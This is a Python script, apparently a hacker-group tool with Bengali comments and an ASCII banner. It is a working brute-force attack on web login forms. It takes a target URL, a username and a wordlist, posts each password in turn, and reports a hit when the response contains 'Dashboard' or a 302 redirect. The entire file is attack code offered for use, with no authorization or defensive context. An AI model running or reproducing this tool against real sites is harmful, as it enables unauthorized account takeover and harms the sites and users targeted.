import requests
import sys
import time

# টার্মিনাল কালার কোড
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'

def banner():
    ascii_art = f"""
{RED}  _______ ______  __  ______    ____  ____  __  ______  ______
 /_  __//_  __ / / / / / __ \  / __ )/ __ \/ / / / __ \/ ____/
  / /    / / / / / / / / /_/ / / __  / /_/ / / / / / / / __/   
 / /    / / / /_/ / / / _, _/ / /_/ / _, _/ /_/ / /_/ / /___   
/_/    /_/  \____/ /_/_/ |_| /_____/_/ |_|\____/\____/_____/   
                                                               
      {YELLOW}>> Created by: Ariyan Islam Munna (TEAM KHAN) <<{RESET}
    """
    print(ascii_art)

def brute_force(url, username, wordlist_path):
    banner()
    print(f"{BLUE}[*] Target URL: {url}")
    print(f"[*] Username: {username}")
    print(f"[*] Loading Wordlist...{RESET}\n")

    try:
        with open(wordlist_path, 'r') as file:
            for password in file:
                password = password.strip()
                # এখানে আপনার ফর্ম ডেটা অনুযায়ী 'username' ও 'password' ফিল্ড নেম পরিবর্তন করতে হতে পারে
                data = {'username': username, 'password': password}
                
                print(f"{YELLOW}[-][TRYING] {password}{RESET}", end="\r")
                
                response = requests.post(url, data=data)
                
                # যদি লগইন সফল হয় (এটি সাইটের ওপর নির্ভর করে, যেমন: ড্যাশবোর্ড রিডাইরেক্ট)
                if "Dashboard" in response.text or response.status_code == 302:
                    print(f"\n\n{GREEN}[+] SUCCESS! Password Found: {password}{RESET}")
                    return
                
        print(f"\n{RED}[!] Password not found in wordlist.{RESET}")
        
    except FileNotFoundError:
        print(f"{RED}[!] Error: Wordlist file not found!{RESET}")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"{BLUE}Usage: python3 brute.py <url> <user> <wordlist.txt>{RESET}")
    else:
        brute_force(sys.argv[1], sys.argv[2], sys.argv[3])
